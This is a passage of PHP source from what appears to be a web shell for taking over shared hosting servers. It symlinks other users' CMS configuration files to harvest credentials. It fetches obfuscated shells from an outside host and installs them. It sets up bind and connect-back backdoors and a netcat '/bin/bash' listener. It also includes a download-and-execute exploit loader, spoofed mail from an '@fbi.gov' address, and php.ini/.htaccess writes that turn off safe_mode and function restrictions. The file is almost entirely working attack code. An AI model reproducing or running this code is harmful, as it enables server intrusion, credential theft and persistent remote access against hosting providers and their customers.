    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
  }
  function chk_header($link) {
    $tmp=get_headers($link,1);
    if(strpos($tmp[0],"200")) {
      return true;
    }
    else {
      return false;
    }
  }
  function Find($str,$start,$end) {
    $len=strlen($str);
    $start_pos=(strpos($str,$start)+strlen($start));
    $str=substr($str,$start_pos);
    $end_pos=strpos($str,$end);
    $str=substr($str,0,$end_pos);
    return $str;
  }
  $pageURL='http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
  $u=explode("/",$pageURL);
  $pageURL=str_replace($u[count($u)-1],"",$pageURL);
  function cms_add($link,$domain,$owner,$cms) {
    $link=$link.'-'.$cms.'.txt';
    if(chk_header($link)) {
      $url='http://'.$domain;
      $str='<tr><td><a href='.$url.' target="_blank">'.$domain.'</a></td><td>'.$owner.'</td><td align="center"><a 
href='.$link.' target="_blank" class="gaya">'.$cms.'</td>'.Chr(10);
      file_put_contents("tmp.tmp",$str,FILE_APPEND);
      echo $str;
    }
  }
  function CurlPage($url,$post=null,$head=true) {
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_HEADER,$head);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,true);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,2);
    curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch,CURLOPT_COOKIEFILE,"COOKIE.txt");
    curl_setopt($ch,CURLOPT_COOKIEJAR,"COOKIE.txt");
    If($post!=NULL) {
      curl_setopt($ch,CURLOPT_POST,1);
      curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
    }
    $urlPage=curl_exec($ch);
    if(curl_errno($ch)) {
      echo curl_error($ch);
    }
    curl_close($ch);
    return($urlPage);
  }
  function listall($file,$str) {
    if(file_exists($file)) {
      $do=file_get_contents($file);
      if(!strpos($do,$str)) {
        file_put_contents($file,$str,FILE_APPEND);
      }
    }
    else {
      file_put_contents($file,$str,FILE_APPEND);
    }
  }
  echo "<br/><center>[Cms] : <span class='gaya'>Symlink With Cms Detector</span> <a href='?x=cms&do=detect' class='no'><button class='inputzbut'>Symlink</button></a><br/>";
  if(($_GET['x']=='cms')&&($_GET['do']=='detect')) {
    if(!file_exists('tmp.tmp')) {
      @fopen('tmp.tmp','w');
      echo "<br/><div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0'>";
      echo "<thead><th>Domains</th><th>Users</th><th style='width:70px;padding:0px;'>Symlink</th></thead>";
      $p=0;
      if(is_readable("/var/named")) {
        $list=scandir("/var/named");
        $current_dir=posix_getcwd();
        $dir=explode("/",$current_dir);
        foreach($list as $domain) {
          if(strpos($domain,".db")) {
            $domain=str_replace('.db','',$domain);
            $owner=posix_getpwuid(fileowner("/etc/valiases/".$domain));
            error_reporting(0);
            $link=$pageURL.'tmp/'.$owner['name'];
            cms_add($link,$domain,$owner['name'],"WordPress");
            cms_add($link,$domain,$owner['name'],"Joomla");
            cms_add($link,$domain,$owner['name'],"vBulletin");
            cms_add($link,$domain,$owner['name'],"WHMCS");
            cms_add($link,$domain,$owner['name'],"PhpBB");
            cms_add($link,$domain,$owner['name'],"MyBB");
            cms_add($link,$domain,$owner['name'],"IPB");
            cms_add($link,$domain,$owner['name'],"SMF");
            cms_add($link,$domain,$owner['name'],"Drupal");
            cms_add($link,$domain,$owner['name'],"e107");
            cms_add($link,$domain,$owner['name'],"Seditio");
            cms_add($link,$domain,$owner['name'],"osCommerce");
          }
        }
      }
    }
    else {
      echo "<br/><div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0'>";
      echo "<thead><th>Domains</th><th>Users</th><th style='width:70px;padding:0px;'>Symlink</th></thead>";
      $content=file_get_contents($pageURL.'tmp.tmp');
      echo $content;
    }
    echo "<tr><th colspan='3'><a href='".$pageURL."tmp' target='_blank' class='no'><button class='inputzbut'>View Symlink</button></a><a href='?x=cms&do=cancms' class='no'><button class='inputzbut'>Cancel Symlink</button></a></th></tr></table></div>";
  }
  if(($_GET['x']=='cms')&&($_GET['do']=='cancms')) {
    if(file_exists('tmp.tmp')) {
      @unlink('tmp.tmp');
      @exe('rm -r tmp');
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='port')) {
  echo "<br/><center style='-webkit-margin-before:20px;'>";
  echo "[URL] : <a href='http://".$server_ip.":13123' target='_blank' class='gaya' id='aisi'>http://".$server_ip.":13123</a>";
  echo '<form method="post"><table class="tabnet"><tr><th colspan="4">Symlink Port</th></tr><tr><td>Port : </td><td><input size="35" name="portname" type="numeric" value="13123" class="inputz" onkeypress="ganti()" id="portname" style="width:100;"></td><td><select name="pilihport" class="inputz"><option value="pl">Perl</option><option value="py">Python</option></select></td><td><input class="inputzbut" type="submit" name="symport" value="Symlink" /></td></tr></table></form>';
  $np=$_POST['portname'];
  if(isset($_POST['symport'])) {
    $ats=gzinflate(str_rot13(base64_decode('RknULy0u0kLKzNNCzStGKKgsycjP4+XKzC3ILypECAbSOakeISEBwalScqlSCIn85OzUEjTB/G9eLgA=')));
    $bwh=gzinflate(str_rot13(base64_decode('co4xeMMwEIXnBvIfDi9JVZBqgacumU9VvAvFvmDRS0VB1yo/P5IwtNDxHve993o39g5NO7Og1n3fd70Y67Rh1Wnz4aMc58mSdbtpl++jZNMDCW242iU88DgM5yvSD5L8DS74/MbI62Kmc+YwFcaPX8jr//C5kk80zQGCJ94dYIXKSSDrSzQnn8AHZ8CzjRArAt5OwtuNfMoBGK44KHVgD5FW1LY/JfgyxUFORERdl0WSuSBNUzn6Uv3jqrKsePruCYt0zt8=')));
    $pt="port = ".$np;
    $r=$ats.$pt.$bwh;
    switch($_POST['pilihport']) {
      case 'pl':
      $f=fopen('port.pl','w');
      fwrite($f,$r);
      echo "<span class='gaya'>[</span> <a href='http://".$server_ip.":".$np."' target='_blank'>DONE</a> <span class='gaya'>]</span>";
      @exe('perl port.pl');
      break;
      case 'py':
      $f=fopen('port.py','w');
      fwrite($f,$r);
      echo "<span class='gaya'>[</span> <a href='http://".$server_ip.":".$np."' target='_blank'>DONE</a> <span class='gaya'>]</span>";
      @exe('python port.py');
      break;
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='db')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=db" method="post" style="-webkit-margin-before:20px;">
<?php
echo "<br/><center>";
  $dbshell=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/db.php');
  $dbshellcss=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/db.css');
  mkdir('db',0755);
  chdir('db');
  $file=fopen("db.php","w+");
  $write=fwrite($file,gzinflate(base64_decode(str_rot13(strrev($dbshell)))));
  fclose($file);
  $file2=fopen("db.css","w+");
  $write2=fwrite($file2,gzinflate(base64_decode(str_rot13(strrev($dbshellcss)))));
  fclose($file2);
  chmod("db.php",0644);
  chmod("db.css",0644);
  echo "<span class='normal'>[URL] :</span> <a href='".$alamat."/db/db.php' target='_blank' class='link'>http://".$_SERVER['HTTP_HOST'].$alamat."/db/db.php</a>";
  if(isset($_POST['candb'])) {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Install' name='insdb'/></form>";
    chdir('db');
    if(file_exists('db.php')) {
      @unlink('db.php');
      @unlink('db.css');
      chdir('..');
      @rmdir('db');
    }
  }
  else {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='candb'/></form>";
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='mysql')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=mysql" method="post" style="-webkit-margin-before:20px;">
<?php
echo "<br/><center>";
  $sqlshell=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/sql.php');
  $file=fopen("sql.php","w+");
  $write=fwrite($file,gzinflate(base64_decode(str_rot13(strrev($sqlshell)))));
  fclose($file);
  chmod("sql.php",0644);
  echo "<span class='normal'>[URL] :</span> <a href='".$alamat."/sql.php' target='_blank' class='link'>http://".$_SERVER['HTTP_HOST'].$alamat."/sql.php</a>";
  if(isset($_POST['cansql'])) {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Install' name='inssql'/></form>";
    if(file_exists('sql.php')) {
      @unlink('sql.php');
    }
  }
  else {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='cansql'/></form>";
  }
  echo "<br/><br/><iframe src=".$alamat."/sql.php width=97% height=580px frameborder=0></iframe></center></form>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='cpanel')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=cpanel" method="post" style="-webkit-margin-before:20px;">
<?php
echo "<br/><center>";
  $cpshell=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/cp.php');
  $file=fopen("cp.php","w+");
  $write=fwrite($file,gzinflate(base64_decode(str_rot13(strrev($cpshell)))));
  fclose($file);
  chmod("cp.php",0644);
  echo "<span class='normal'>[URL] :</span> <a href='".$alamat."/cp.php' target='_blank' class='link'>http://".$_SERVER['HTTP_HOST'].$alamat."/cp.php</a>";
  if(isset($_POST['cancp'])) {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Install' name='inscp'/></form>";
    if(file_exists('cp.php')) {
      @unlink('cp.php');
    }
  }
  else {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='cancp'/></form>";
  }
  echo "<br/><br/><iframe src=".$alamat."/cp.php width=97% height=580px frameborder=0 style='overflow-y:hidden;'></iframe></center></form>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='whmcs')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=whmcs" method="post" style="-webkit-margin-before:20px;">
<?php
echo "<br/><center>";
  $whmshell=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/whm.php');
  $file=fopen("whm.php","w+");
  $write=fwrite($file,gzinflate(base64_decode(str_rot13(strrev($whmshell)))));
  fclose($file);
  chmod("whm.php",0644);
  echo "<span class='normal'>[URL] :</span> <a href='".$alamat."/whm.php' target='_blank' class='link'>http://".$_SERVER['HTTP_HOST'].$alamat."/whm.php</a>";
  if(isset($_POST['canwhm'])) {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Install' name='inswhm'/></form>";
    if(file_exists('whm.php')) {
      @unlink('whm.php');
    }
  }
  else {
    echo "<form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='canwhm'/></form>";
  }
  echo "<br/><br/><iframe src=".$alamat."/whm.php width=97% height=575px frameborder=0 ></iframe></center></form>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='ins')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=ins" method="post" style="-webkit-margin-before:35px;">
<?php
echo "<center>";
  echo "
<form action='".$pwd."&amp;x=ins' method='post'>
<table class='tabnet'>
<tr>
<th colspan='3'>Install Shell</th>
</tr>
<tr>
<td>Name Folder</td><td>:</td><td><input class='inputz' type='text' name='insdir' value='cgi-bin'/></td>
</tr>
<tr>
<td>Name Shell</td><td>:</td><td><input id='wow' class='inputz' type='text' name='insname' value='shell.pl'/>
</td>
</tr>
<tr>
<td>Type Shell</td><td>:</td><td><select id='options' class='inputz' name='ins' onchange='optionCheck()'>
<option value='pl'>Perl</option>
<option value='py'>Python</option>
<option value='asp'>ASP</option>
<option value='aspx'>ASPX</option>
<option value='jsp'>JSP</option>
</select></td>
</tr>
<tr>
<th colspan='3'><input class='inputzbut' type='submit' name='installz' value='install'/></th>
</tr>
</table>
</form> ";
  $dirz=$_POST['insdir'];
  $namez=$_POST['insname'];
  $urlz=str_replace($_SERVER['DOCUMENT_ROOT'],"",@getcwd());
  $met="Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .cgi .jpg .gif .png .txt .zip .rar .tar .gz .pdf .doc .xls .htm .html .bin .sh .root .sys .pl .py
AddHandler cgi-script .cgi .jpg .gif .png .txt .zip .rar .tar .gz .pdf .doc .xls .htm .html .bin .sh .root .sys .pl .py
AddHandler cgi-script .cgi .jpg .gif .png .txt .zip .rar .tar .gz .pdf .doc .xls .htm .html .bin .sh .root .sys .pl .py";
  if(isset($_POST['installz'])) {
    if($dirz!='') {
      switch($_POST['ins']) {
        case 'pl':
        mkdir($dirz,0755);
        chdir($dirz);
        $tai=".htaccess";
        $sem="$tai";
        $sim=fopen($sem,'w')ordie("Error");
        fwrite($sim,$met);
        fclose($sim);
        $cgiz=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/shell.pl');
        $cgi=fopen($namez,"w+");
        $write=fwrite($cgi,gzinflate(base64_decode(str_rot13(strrev($cgiz)))));
        fclose($cgi);
        chmod($namez,0755);
        echo "<br/>Successfull Install <a href='".$urlz."/".$dirz."/".$namez."' target='_blank'><span class='gaya'>".$namez."</span></a>";
        break;
        case 'py':
        mkdir($dirz,0755);
        chdir($dirz);
        $tai=".htaccess";
        $sem="$tai";
        $sim=fopen($sem,'w')ordie("Error");
        fwrite($sim,$met);
        fclose($sim);
        $cgiz=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/shell.py');
        $cgi=fopen($namez,"w+");
        $write=fwrite($cgi,gzinflate(base64_decode(str_rot13(strrev($cgiz)))));
        fclose($cgi);
        chmod($namez,0755);
        echo "<br/>Successfull Install <a href='".$urlz."/".$dirz."/".$namez."' target='_blank'><span class='gaya'>".$namez."</span></a>";
        break;
        case 'asp':
        mkdir($dirz,0755);
        chdir($dirz);
        $aspxz=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/shell.asp');
        $aspx=fopen($namez,"w+");
        $write=fwrite($aspx,gzinflate(base64_decode(str_rot13(strrev($aspxz)))));
        fclose($aspx);
        chmod($namez,0755);
        echo "<br/>Successfull Install <a href='".$urlz."/".$dirz."/".$namez."' target='_blank'><span class='gaya'>".$namez."</span></a>";
        break;
        case 'aspx':
        mkdir($dirz,0755);
        chdir($dirz);
        $aspxz=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/shell.aspx');
        $aspx=fopen($namez,"w+");
        $write=fwrite($aspx,gzinflate(base64_decode(str_rot13(strrev($aspxz)))));
        fclose($aspx);
        chmod($namez,0755);
        echo "<br/>Successfull Install <a href='".$urlz."/".$dirz."/".$namez."' target='_blank'><span class='gaya'>".$namez."</span></a>";
        break;
        case 'jsp':
        mkdir($dirz,0755);
        chdir($dirz);
        $aspxz=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/shell.jsp');
        $aspx=fopen($namez,"w+");
        $write=fwrite($aspx,gzinflate(base64_decode(str_rot13(strrev($aspxz)))));
        fclose($aspx);
        chmod($namez,0755);
        echo "<br/>Successfull Install <a href='".$urlz."/".$dirz."/".$namez."' target='_blank'><span class='gaya'>".$namez."</span></a>";
        break;
      }
    }
    else {
      echo "<br/>Error Cannot Install <span class='guyu'>".$namez."</span>";
    }
  }
}
elseif(isset($_GET['view'])&&($_GET['view']!="")) {
  if(is_file($_GET['view'])) {
    if(!isset($file)) 
      $file=magicboom($_GET['view']);
    if(!$win&&$posix) {
      $name=@posix_getpwuid(@fileowner($folder));
      $group=@posix_getgrgid(@filegroup($folder));
      $owner=$name['name']." : ".$group['name'];
    }
    else {
      $owner=$user;
    }
    $owner=$user;
    $filn=basename($file);
    echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\"> <tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span> <form action=\"?y=".$pwd."\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" /></form><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($filn)."_form6\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldfile\" value=\"".$filn."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:100%;\" type=\"text\" name=\"newfile\" value=\"".$pwd."copy_of_".$filn."\" /><input class=\"inputzbut\" type=\"submit\" name=\"copy\" value=\"copy\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form6');\" /></form><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($filn)."_form7\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldmove\" value=\"".$filn."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:100%;\" type=\"text\" name=\"newmove\" value=\"".$pwd.$filn."\" /><input class=\"inputzbut\" type=\"submit\" name=\"move\" value=\"move\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form7');\" /></form></td></tr> <tr><td>Size</td><td>".ukuran($file)."</td></tr> <tr><td>Permission</td><td>".substr(sprintf('%o',fileperms($file)),-4)." | ".get_perms($file)."</td></tr> <tr><td>Owner</td><td>".$owner."</td></tr> <tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr> <tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr> <tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr> <tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form6');\">copy</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form7');\">move</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a> (<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr> <tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">image</a></td></tr> </table> ";
    if(isset($_GET['type'])&&($_GET['type']=='image')) {
      echo "<div style=\"text-align:center;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
    }
    elseif(isset($_GET['type'])&&($_GET['type']=='code')) {
      echo "<div class=\"viewfile\">";
      $file=wordwrap(@file_get_contents($file),"240","\n");
      @highlight_string($file);
      echo "</div>";
    }
    else {
      echo "<div class=\"viewfile\">";
      echo nl2br(htmlentities((@file_get_contents($file))));
      echo "</div>";
    }
  }
  elseif(is_dir($_GET['view'])) {
    echo showdir($pwd,$prompt);
  }
}
elseif(isset($_GET['edit'])&&($_GET['edit']!="")) {
  if(isset($_POST['save'])) {
    $file=$_POST['saveas'];
    $filed=basename($file);
    $content=magicboom($_POST['content']);
    $cp_file=$_POST['cp_file'];
    if($filez=@fopen($file,"w")) {
      $time=date("d-M-Y H:i",time());
      if(@fwrite($filez,$content)) 
        $msg="file saved <span class=\"gaya\">@</span> ".$time;
      else 
        $msg="failed to save";
      @fclose($filez);
      if(isset($cp_file)) {
        $dir_open=opendir('.');
        while(false!==($filename=readdir($dir_open))) {
          if($filename!="."&&$filename!="..") {
            if(is_dir($filename)) {
              $link=$filename;
              copy($file,$pwd.$link."/".$filed);
            }
          }
        }
        closedir($dir_open);
      }
    }
    else 
      $msg="permission denied";
  }
  if(!isset($file)) 
    $file=$_GET['edit'];
  if($filez=@fopen($file,"r")) {
    $content="";
    while(!feof($filez)) {
      $content.=htmlentities(str_replace("''","'",fgets($filez)));
    }
    @fclose($filez);
  }
  ?>
<form action="?y=<?php echo $pwd;?>&amp;edit=<?php echo $file;?>" method="post"><br/><table class="cmdbox"><tr><td colspan="2"><textarea class="output" name="content"><?php echo $content;?></textarea><tr><td colspan="2">Save As <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:40%;" value="<?php echo $file;?>" /> <input type="checkbox" name="cp_file" /> Copy To All Sub Directories <input class="inputzbut" type="submit" value="Save !" name="save" /> <?php echo $msg;?></td></tr></table></form>
<?php
}
elseif(isset($_GET['x'])&&($_GET['x']=='netsploit')) {
  echo "<center style='-webkit-margin-before:35px;'>";
  if(isset($_POST['bind'])&&!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=='C')) {
    $port=trim($_POST['port']);
    $passwrd=trim($_POST['bind_pass']);
    tulis("bdc.c",$port_bind_bd_c);
    exe("gcc -o bdc bdc.c");
    exe("chmod 777 bdc");
    @unlink("bdc.c");
    exe("./bdc ".$port." ".$passwrd." &");
    $scan=exe("ps aux");
    if(eregi("./bdc $por",$scan)) {
      $msg="<p>Process found running, backdoor setup successfully.</p>";
    }
    else {
      $msg="<p>Process not found running, backdoor not setup successfully.</p>";
    }
  }
  elseif(isset($_POST['bind'])&&!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=='Perl')) {
    $port=trim($_POST['port']);
    $passwrd=trim($_POST['bind_pass']);
    tulis("bdp",$port_bind_bd_pl);
    exe("chmod 777 bdp");
    $p2=which("perl");
    exe($p2." bdp ".$port." &");
    $scan=exe("ps aux");
    if(eregi("$p2 bdp $port",$scan)) {
      $msg="<p>Process found running, backdoor setup successfully.</p>";
    }
    else {
      $msg="<p>Process not found running, backdoor not setup successfully.</p>";
    }
  }
  elseif(isset($_POST['backconn'])&&!empty($_POST['backport'])&&!empty($_POST['ip'])&&($_POST['use']=='C')) {
    $ip=trim($_POST['ip']);
    $port=trim($_POST['backport']);
    tulis("bcc.c",$back_connect_c);
    exe("gcc -o bcc bcc.c");
    exe("chmod 777 bcc");
    @unlink("bcc.c");
    exe("./bcc ".$ip." ".$port." &");
    $msg="Now script try connect to ".$ip." port ".$port." ...";
  }
  elseif(isset($_POST['backconn'])&&!empty($_POST['backport'])&&!empty($_POST['ip'])&&($_POST['use']=='Perl')) {
    $ip=trim($_POST['ip']);
    $port=trim($_POST['backport']);
    tulis("bcp",$back_connect);
    exe("chmod +x bcp");
    $p2=which("perl");
    exe($p2." bcp ".$ip." ".$port." &");
    $msg="Now script try connect to ".$ip." port ".$port." ...";
  }
  elseif(isset($_POST['expcompile'])&&!empty($_POST['wurl'])&&!empty($_POST['wcmd'])) {
    $pilihan=trim($_POST['pilihan']);
    $wurl=trim($_POST['wurl']);
    $namafile=download($pilihan,$wurl);
    if(is_file($namafile)) {
      $msg=exe($wcmd);
    }
    else 
      $msg="error: file not found $namafile";
  }
  ?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd;?>&amp;x=netsploit">
<tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass;?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd;?>&amp;x=netsploit">
<tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo((getenv('REMOTE_ADDR'))?(getenv('REMOTE_ADDR')):("127.0.0.1"));?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport;?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd;?>&amp;x=netsploit">
<tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
</tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
</table>
</td>
</tr>
</table>
<form action="" method="post">
<table class="tabnet" align="center">
<tr>
<td style="padding-left:3;">Netcat $ <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:629px;"value="./nc -vv -l -p 6969 -e /bin/bash" /></td>
<?php
if(isset($_POST['submitcmd'])) {
    if(!file_exists('nc')) {
      @exe('wget http://syntax-errorz.googlecode.com/svn/trunk/nc');
    }
    @exe('chmod 777 nc');
    @exe($_POST['cmd']);
    echo '<td><input class="inputzbut" type="submit" value="Stops !" name="cancelcmd" style="width:80px;" /></td>';
  }
  else {
    echo '<td><input class="inputzbut" type="submit" value="Start !" name="submitcmd" style="width:80px;" /></td>';
  }
  if(isset($_POST['cancelcmd'])) {
    if(file_exists('nc')) {
      @unlink('nc');
    }
  }
  ?>
</tr></table></form>
<div style="text-align:center;margin:2px;"><?php echo $msg;?></div>
<?php
}
elseif(isset($_GET['x'])&&($_GET['x']=='mail')) {
  echo "<center style='-webkit-margin-before:20px;'>";
  if(isset($_POST['mail_send'])) {
    $mail_to=$_POST['mail_to'];
    $mail_from=$_POST['mail_from'];
    $mail_subject=$_POST['mail_subject'];
    $mail_content=magicboom($_POST['mail_content']);
    if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")) {
      $msg="[Mail] : <span class='gaya'>Success Sent To</span> $mail_to";
    }
    else 
      $msg="[Mail] : <span class='guyu'>Send Failed</span>";
  }
  ?>
<br/>
<form action="?y=<?php echo $pwd;?>&amp;x=mail" method="post">
<textarea class="output" name="mail_content" id="cmd" style="height:280px;">Hey there, please patch me ! </textarea>
<table class="cmdbox" width="20%">
<tr><td>Mail To &nbsp; : <input class="inputz" style="width:20%;" type="text" value="<?php echo $admin_id;?>" name="mail_to" /></td></tr>
<tr><td>From &nbsp; &nbsp; : <input class="inputz" style="width:20%;" type="text" value="<?php echo $xName."@fbi.gov";?>" name="mail_from" /></td></tr>
<tr><td>Subject : <input class="inputz" style="width:20%;" type="text" value="Patch Your System" name="mail_subject" /></td></tr>
<tr><td><input style="width:23%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr>
<tr><td><?php echo $msg;?></td></tr>
</table>
<?php
}
elseif(isset($_GET['x'])&&($_GET['x']=='bypass')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=bypass" method="post" style="-webkit-margin-before:20px;">
<input name="matikan" type="hidden" value="sekatan">
<?php
if(($safemode=='0')&&''==($func=@ini_get('disable_functions'))) {
    echo "<br/><center>[Bypass] : <span class='gaya'>Safemode And Disable Function Was Successfull</span>
</center>";
  }
  else {
    echo "<br/><center>[Bypass] : <span class='gaya'>Safemode And Disable Function With</span> 
<select class='inputzbut' name='type'>
<option value='1'>php.ini</option>
<option value='2'>.htaccess</option>
<option value='3'>Both</option>
</select>
<input class='inputzbut' type='submit' value='Go !'/>
</center>";
  }
  ?>
<?php
if($_POST['matikan']=='sekatan') {
    @error_reporting(0);
    $phpini='c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
    $htaccess='T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
    if($_POST['type']=='1') {
      $file=fopen("php.ini","w+");
      $write=fwrite($file,base64_decode($phpini));
      fclose($file);
    }
    if($_POST['type']=='2') {
      $file=fopen(".htaccess","w+");
      $write=fwrite($file,base64_decode($htaccess));
      fclose($file);
    }
    if($_POST['type']=='3') {
      $file1=fopen("php.ini","w+");
      $write1=fwrite($file1,base64_decode($phpini));
      fclose($file1);
      $file2=fopen(".htaccess","w+");
      $write2=fwrite($file2,base64_decode($htaccess));
      fclose($file2);
    }
    echo "<center><span class='gaya'>[</span> <a href=".$_SERVER['PHP_SELF'].">DONE</a> <span class='gaya'>]</span></center>";
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='logout')) {
  ?>
